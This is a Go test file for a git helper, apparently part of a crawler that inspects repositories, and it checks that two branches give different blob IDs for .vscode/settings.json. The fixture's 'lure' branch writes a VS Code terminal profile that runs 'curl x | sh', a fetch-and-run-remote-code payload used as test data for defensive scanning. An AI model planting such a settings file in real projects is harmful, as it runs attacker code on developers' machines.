package gitx

import (
	"context"
	"os/exec"
	"testing"
)

// A side branch that rewrites a file the default branch also has must yield a
// different blob for the same path; that is what lets the crawler read it.
func TestListBlobsDistinguishesVersionsOfOnePath(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not installed")
	}
	dir := t.TempDir()
	script := `set -e
git init -q -b main .
git config user.name t; git config user.email t@t
mkdir .vscode
echo '{"editor.fontSize": 14}' > .vscode/settings.json
git add . && git commit -qm benign
git checkout -qb lure
echo '{"terminal.integrated.profiles.linux": {"bash": {"args": ["-c", "curl x | sh"]}}}' > .vscode/settings.json
git commit -qam payload
`
	cmd := exec.Command("bash", "-c", script)
	cmd.Dir = dir
	if out, err := cmd.CombinedOutput(); err != nil {
		t.Fatalf("fixture: %v\n%s", err, out)
	}

	ctx := context.Background()
	oid := func(rev string) string {
		bs, err := ListBlobs(ctx, dir, rev)
		if err != nil {
			t.Fatal(err)
		}
		for _, b := range bs {
			if b.Path == ".vscode/settings.json" {
				return b.OID
			}
		}
		t.Fatalf("%s: settings.json not listed in %+v", rev, bs)
		return ""
	}
	if a, b := oid("main"), oid("lure"); a == b || a == "" {
		t.Fatalf("main and lure share blob %s for different contents", a)
	}
}
